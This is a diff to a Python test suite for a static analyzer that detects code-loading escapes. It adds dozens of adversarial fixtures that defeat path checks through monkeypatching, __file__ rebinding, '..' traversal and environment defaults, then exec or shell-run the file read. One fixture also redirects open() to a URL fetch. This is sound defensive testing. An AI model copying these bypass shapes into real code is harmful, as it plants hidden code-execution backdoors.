@@ -240,6 +240,12 @@ def test_benign_idiom(case_id, relpath, expect, src):
 
 
 def test_module_level_anchor_referenced_inside_a_function_is_unresolved_in_strict_mode():
+    # B-850 round 2 (C-135 adversarial review of commit 8b5a7b26): the reviewer
+    # re-confirmed this exact shape is real-but-not-exploitable and out of scope for
+    # this round -- diff-verified byte-for-byte unchanged against the true parent
+    # commit 8b5a7b26 across the whole battery of round-2 fixes (fail-closed guard,
+    # with_name('..'), comprehension/walrus resolution, staticness rework, runtime-
+    # segment counting, TT5 disclosure). Left pinned, not fixed.
     src = (
         HDR
         + "HERE = os.path.dirname(os.path.abspath(__file__))\n"
@@ -326,7 +332,341 @@ _ATTACK_CASES = [
 
 @pytest.mark.parametrize("case_id,relpath,src", _ATTACK_CASES)
 def test_attack_shape_never_reads_clean(case_id, relpath, src):
-    assert _verdict(src, relpath) != "clean", case_id
+    # B-850 round 2: every case in this battery is a PROVEN escape (a literal
+    # traversal, a rebound anchor, a helper returning an absolute literal, ...), not
+    # a merely-ambiguous one -- `!= "clean"` would let a WARN-only verdict (UNPROVEN,
+    # non-crit) pass just as easily as the crit this battery exists to pin. Tightened
+    # to `== "convict"` per the round-2 adversarial review.
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2 (C-135 adversarial review of commit 8b5a7b26): fail-closed namespace/
+# monkeypatch guard. A skill that rebinds `__file__` through any indirect channel, or
+# monkeypatches a trusted path primitive this very recognizer relies on, has a
+# namespace the static analysis cannot trust at all -- ONE guard caps the whole
+# file's verdict at NOT_ANCHORED (never a silent exemption) rather than chasing each
+# such primitive as its own bypass shape.
+# ---------------------------------------------------------------------------------
+_FAILCLOSED_CASES = [
+    ("H1-monkeypatch-os-path-dirname", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')", "os.path.dirname = lambda p: '/tmp'\n")),
+    ("H2-monkeypatch-os-path-join", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')", "os.path.join = lambda *a: '/tmp/x.py'\n")),
+    ("H3-setattr-os-path-join", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "setattr(os.path, 'join', lambda *a: '/tmp/x.py')\n")),
+    ("H4-monkeypatch-builtins-open", "pkg/mod.py",
+     "import builtins\nimport urllib.request\n"
+     "builtins.open = lambda *a, **k: urllib.request.urlopen('http://e.example/p')\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("H5-dunder-file-via-globals-subscript", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "globals()['__file__'] = '/tmp/e/y.py'\n")),
+    ("H6-dunder-file-via-sysmodules-attr", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "sys.modules[__name__].__file__ = '/tmp/e/y.py'\n")),
+    ("H7-dunder-file-via-exec-string-literal", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "exec(\"__file__ = '/tmp/e/y.py'\")\n")),
+    ("H8-dunder-file-via-globals-update", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "globals().update(__file__='/tmp/e/y.py')\n")),
+    ("H9-meipass-mutation-via-aliased-sys", "mod.py",
+     HDR + "m = sys\nm._MEIPASS = '/tmp'\n"
+     + _rd("os.path.join(base, 'x.py')",
+           "base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n")),
+    ("H10-meipass-mutation-via-sysmodules", "mod.py",
+     HDR + "sys.modules['sys']._MEIPASS = '/tmp'\nsys.modules['sys'].frozen = True\n"
+     + _rd("os.path.join(base, 'x.py')",
+           "if getattr(sys, 'frozen', False):\n    base = sys._MEIPASS\n"
+           "else:\n    base = os.path.dirname(os.path.abspath(__file__))\n")),
+    ("H11-function-object-code-swap", "pkg/mod.py",
+     HDR + "def h():\n    return os.path.join(os.path.dirname(__file__), 'v.py')\n"
+     "def g():\n    return '/tmp/x.py'\nh.__code__ = g.__code__\n" + _rd("h()")),
+    ("H12-function-object-defaults-swap", "pkg/mod.py",
+     HDR + "def h(base=os.path.dirname(__file__)):\n    return os.path.join(base, 'x.py')\n"
+     "h.__defaults__ = ('/tmp',)\n" + _rd("h()")),
+    ("H13-listdir-monkeypatch", "pkg/mod.py",
+     HDR + H + "os.listdir = lambda p: ['../../tmp/x.py']\n"
+     "for f in os.listdir(here):\n    with open(os.path.join(here, f), 'rb') as fh:\n"
+     "        exec(fh.read().decode(), {})\n"),
+    ("H14-star-import-rebinds-join", "pkg/mod.py",
+     HDR + "from _helpers import *\n" + _rd("join(dirname(__file__), 'x.py')")),
+    ("H15-os-path-module-rebind", "pkg/mod.py",
+     "import os\nimport sys\nimport types\n"
+     "os.path = types.SimpleNamespace(join=lambda *a: '/tmp/x.py', dirname=lambda p: p)\n"
+     'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
+     "    exec(fh.read().decode(), {})\n"),
+    ("H16-sysmodules-os-path-swap", "pkg/mod.py",
+     "import sys\nimport types\n"
+     "sys.modules['os.path'] = types.SimpleNamespace(join=lambda *a: '/tmp/x.py', dirname=lambda p: p)\n"
+     "import os.path\n"
+     'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
+     "    exec(fh.read().decode(), {})\n"),
+    ("H17-class-attr-dunder-file", "pkg/mod.py",
+     HDR + "class C:\n    __file__ = '/tmp/e/y.py'\n"
+     "    with open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb') as fh:\n"
+     "        exec(fh.read().decode(), {})\n"),
+    ("H18-lambda-default-dunder-file", "pkg/mod.py",
+     HDR + "f = lambda __file__='/tmp/e/y.py': "
+     "open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')\n"
+     "exec(f().read().decode(), {})\n"),
+    ("H19-nested-func-param-dunder-file", "pkg/mod.py",
+     HDR + "def outer(__file__):\n    def inner():\n"
+     "        with open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb') as fh:\n"
+     "            exec(fh.read().decode(), {})\n    inner()\nouter('/tmp/e/y.py')\n"),
+    ("H20-except-as-dunder-file", "pkg/mod.py",
+     HDR + "try:\n    raise ValueError\nexcept ValueError as __file__:\n    pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("H21-match-capture-dunder-file", "pkg/mod.py",
+     HDR + "match '/tmp/e/y.py':\n    case __file__:\n        pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("H22-dunder-file-global-walrus-in-function", "pkg/mod.py",
+     HDR + "def f():\n    global __file__\n"
+     "    with open((__file__ := '/tmp/e/y.py') and os.devnull):\n        pass\nf()\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _FAILCLOSED_CASES)
+def test_fail_closed_namespace_guard_convicts(case_id, relpath, src):
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: `with_name('..')` is an up-motion, not a same-level rename --
+# `with_suffix`/`with_stem` are unaffected (they raise or produce non-traversal
+# strings; not a bypass).
+# ---------------------------------------------------------------------------------
+_WITHNAME_CASES = [
+    ("W1-with-name-dotdot-root", "mod.py", _rd("Path(__file__).with_name('..') / 'x.py'")),
+    ("W2-with-name-dotdot-resolve", "mod.py",
+     _rd("Path(__file__).with_name('..').resolve() / 'tmp' / 'x.py'")),
+    ("W3-with-name-dotdot-via-variable", "mod.py",
+     _rd("Path(__file__).with_name(n) / 'x.py'", "n = '..'\n")),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _WITHNAME_CASES)
+def test_with_name_dotdot_convicts(case_id, relpath, src):
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+def test_with_suffix_swap_stays_clean():
+    # Control: with_suffix/with_stem are ordinary same-level renames, unaffected by
+    # the with_name('..') fix.
+    assert _verdict(_rd("str(Path(__file__).with_suffix('.tpl'))"), "mod.py") == "clean"
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: comprehension/walrus free-name resolution. A name bound by an
+# enclosing comprehension's `for x in ...` target -- or by a walrus anywhere in the
+# same statement -- must resolve through that binding, not fall through to the
+# flow-insensitive module-level definition of the same spelling.
+# ---------------------------------------------------------------------------------
+_COMP_WALRUS_CASES = [
+    ("CW1-comprehension-shadows-dunder-file", "pkg/mod.py",
+     HDR + "[exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
+     ".read().decode()) for __file__ in ['/tmp/e/y.py']]\n"),
+    ("CW2-comprehension-shadows-outer-here", "pkg/mod.py",
+     HDR + H + "[exec(open(os.path.join(here, 'x.py'), 'rb').read().decode())"
+     " for here in ['/tmp']]\n"),
+    ("CW3-comprehension-shadow-with-decoy-segment", "pkg/mod.py",
+     HDR + H + "n = 'v.py'\n"
+     "[exec(open(os.path.join(here, n), 'rb').read().decode())"
+     " for n in ['../../tmp/x.py']]\n"),
+    ("CW4-genexp-shadows-dunder-file", "pkg/mod.py",
+     HDR + "any(exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
+     ".read().decode()) for __file__ in ['/tmp/e/y.py'])\n"),
+    ("CW5-walrus-in-with-item", "pkg/mod.py",
+     HDR + "with open((__file__ := '/tmp/e/y.py') and os.devnull):\n    pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("CW6-walrus-in-for-iter", "pkg/mod.py",
+     HDR + "for _ in [(__file__ := '/tmp/e/y.py')]:\n    pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("CW7-walrus-in-function-default", "pkg/mod.py",
+     HDR + "def f(a=(__file__ := '/tmp/e/y.py')):\n    pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("CW8-walrus-in-augassign", "pkg/mod.py",
+     HDR + "k = 0\nk += len(__file__ := '/tmp/e/y.py')\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+    ("CW9-walrus-and-read-same-expression", "pkg/mod.py",
+     HDR + "exec(open(os.path.join(os.path.dirname("
+     "(__file__ := '/tmp/e/y.py') and __file__), 'x.py'), 'rb').read().decode())\n"),
+    ("CW10-walrus-in-while-test", "pkg/mod.py",
+     HDR + "while not (__file__ := '/tmp/e/y.py'):\n    pass\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _COMP_WALRUS_CASES)
+def test_comprehension_and_walrus_shadowing_convicts(case_id, relpath, src):
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+def test_walrus_binding_visible_to_every_load_in_same_statement_non_dunder():
+    # Isolates the reaching-defs ordering fix from the fail-closed guard (which would
+    # also catch every CW5-CW10 case above via its own "__file__ is reassigned" rule):
+    # a plain, non-dunder walrus target read again later in the SAME expression must
+    # resolve to the walrus value, not to an unrelated outer binding of the same name.
+    src = (
+        HDR + "bad = 'v.py'\n"
+        "exec(open(os.path.join(os.path.dirname(__file__), "
+        "(bad := '../../../tmp/x.py') and bad), 'rb').read().decode())\n"
+    )
+    assert _verdict(src, "pkg/sub/mod.py") == "convict"
+
+
+def test_comprehension_shadow_control_stays_clean():
+    # Control: no shadowing at all -- must remain clean.
+    assert _verdict(_rd("os.path.join(here, 'v.py')", H), "pkg/mod.py") == "clean"
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: staticness/UNPROVEN modelling rework. An ordinary runtime idiom
+# (sys.platform, platform.system(), os.getenv with a safe default) must not be folded
+# to 'static' by default and then read as a static value hidden behind an unfoldable
+# expression (ESCAPES) -- it is an anchored-but-runtime-computed segment (UNPROVEN).
+# ---------------------------------------------------------------------------------
+_PLATFORM_HDR = "import os\nimport sys\nimport platform\n"
+
+
+def _rd_platform(path_expr: str, prelude: str = "") -> str:
+    return (
+        _PLATFORM_HDR + prelude
+        + f'with open({path_expr}, "rb") as fh:\n'
+        f'    exec(fh.read().decode("utf-8"), {{}})\n'
+    )
+
+
+_STATICNESS_FP_CASES = [
+    ("S1-sys-platform-segment", "pkg/mod.py",
+     _rd_platform("os.path.join(here, 'impl', sys.platform, 'v.py')", H)),
+    ("S2-platform-system-lower-segment", "pkg/mod.py",
+     _rd_platform("os.path.join(here, 'impl', platform.system().lower() + '.py')", H)),
+    ("S3-getenv-plugin-name-safe-default", "mod.py",
+     HDR + "def load():\n    here = os.path.dirname(__file__)\n"
+     "    name = os.getenv('MYSKILL_PLUGIN', 'default')\n"
+     "    with open(os.path.join(here, 'plugins', name + '.py'), 'rb') as fh:\n"
+     "        exec(fh.read().decode(), {})\n"),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _STATICNESS_FP_CASES)
+def test_runtime_idiom_is_warn_not_convict(case_id, relpath, src):
+    assert _verdict(src, relpath) == "warn", case_id
+
+
+# B-850 round 2: os.getenv(k, default) / os.environ.get(k, default) is modelled as
+# {runtime, default_value} -- a literal-escape default still convicts, and HOME/
+# TMPDIR/PWD/XDG_*/... are absolute-by-construction (NOT_ANCHORED), not an ordinary
+# runtime unknown (which would wrongly stay merely UNPROVEN/exempt).
+_ENV_BYPASS_CASES = [
+    ("E1-home-env-subscript", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ['HOME'], '.cache', '.x.py')", H)),
+    ("E2-home-env-get", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ.get('HOME', ''), '.cache', '.x.py')", H)),
+    ("E3-tmpdir-env-get", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ.get('TMPDIR', '/tmp'), 'x.py')", H)),
+    ("E4-getenv-default-is-absolute-escape", "pkg/mod.py",
+     _rd("os.path.join(here, os.getenv('NOPE', '/tmp/x.py'))", H)),
+    ("E5-environ-get-default-is-absolute-escape", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ.get('NOPE', '/tmp/x.py'))", H)),
+    ("E6-getenv-or-absolute-escape", "pkg/mod.py",
+     _rd("os.path.join(here, os.getenv('NOPE') or '/tmp/x.py')", H)),
+    ("E7-environ-get-empty-prefix-then-absolute", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ.get('NOPE', '') + '/tmp/x.py')", H)),
+    ("E8-environ-get-default-is-traversal", "pkg/mod.py",
+     _rd("os.path.join(here, os.environ.get('NOPE', '../../tmp/x.py'))", H)),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _ENV_BYPASS_CASES)
+def test_env_var_bypass_convicts(case_id, relpath, src):
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: runtime-segment-before-'..' regression. A runtime-computed segment
+# is credited with exactly one level of depth (its worst case) -- a '..' walk that
+# still goes negative even under that generous credit is a PROVEN escape (ESCAPES),
+# restoring the pre-B-850 baseline's conviction on this shape, not merely UNPROVEN.
+# ---------------------------------------------------------------------------------
+def test_runtime_segment_then_dotdot_still_convicts():
+    src = _rd(
+        "os.path.join(here, os.environ.get('NOPE', ''), '..', '..', '..', 'tmp', 'x.py')", H
+    )
+    assert _verdict(src, "pkg/mod.py") == "convict"
+
+
+def test_runtime_segment_alone_stays_warn():
+    # Control: no '..' at all -- a bare runtime segment stays the ordinary UNPROVEN
+    # WARN, not a convict (this fix must not over-convict the ambiguous case).
+    src = _rd("os.path.join(here, os.environ['P'])", H)
+    assert _verdict(src, "pkg/mod.py") == "warn"
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: codecs.open is a recognized open-call, same as builtins.open/io.open.
+# ---------------------------------------------------------------------------------
+def test_codecs_open_recognized_as_bounded():
+    src = (
+        HDR + "import codecs\n"
+        "with codecs.open(os.path.join(os.path.dirname(__file__), 'v.py'), 'rb') as fh:\n"
+        "    exec(fh.read().decode(), {})\n"
+    )
+    assert _verdict(src, "mod.py") == "clean"
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 2: TT5 (shell/subprocess) sinks must disclose an UNPROVEN read via
+# ARTIFACT_READ_UNPROVEN (B394) the same way the direct exec()/eval() branch already
+# does, instead of silently absolving it with zero signal at all.
+# ---------------------------------------------------------------------------------
+_TT5_HDR = "import os\nimport sys\n"
+
+
+def _tt5_findings(src: str, relpath: str = "m.py"):
+    return analyze_python(src, relpath)
+
+
+def test_tt5_os_system_unproven_read_is_disclosed_not_silent():
+    src = (
+        _TT5_HDR
+        + "with open(os.path.join(os.path.dirname(__file__), os.environ['P']), 'rb') as fh:\n"
+        "    os.system(fh.read().decode())\n"
+    )
+    findings = _tt5_findings(src)
+    assert not any(f.severity == "crit" for f in findings)
+    assert any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)
+
+
+def test_tt5_subprocess_unproven_read_is_disclosed_not_silent():
+    src = (
+        _TT5_HDR + "import subprocess\n"
+        "with open(os.path.join(os.path.dirname(__file__), os.environ['P']), 'rb') as fh:\n"
+        "    subprocess.run(fh.read().decode(), shell=True)\n"
+    )
+    findings = _tt5_findings(src)
+    assert not any(f.severity == "crit" for f in findings)
+    assert any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)
+
+
+def test_tt5_bounded_read_still_stays_fully_silent():
+    # Control: a BOUNDED (fully literal, artifact-relative, no runtime segment) read
+    # through a TT5 sink must stay silently exempt -- no ARTIFACT_READ_UNPROVEN, no
+    # crit. Only UNPROVEN gets the disclosure. (A literal, non-artifact-relative read
+    # like '/tmp/x.sh' would be NOT_ANCHORED, not BOUNDED, so it would convict instead
+    # -- not a useful control for this specific assertion.)
+    src = (
+        _TT5_HDR
+        + "with open(os.path.join(os.path.dirname(__file__), 'x.sh'), 'rb') as fh:\n"
+        "    os.system(fh.read().decode())\n"
+    )
+    findings = _tt5_findings(src)
+    assert not any(f.severity == "crit" for f in findings)
+    assert not any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)
 
 
 # ---------------------------------------------------------------------------------
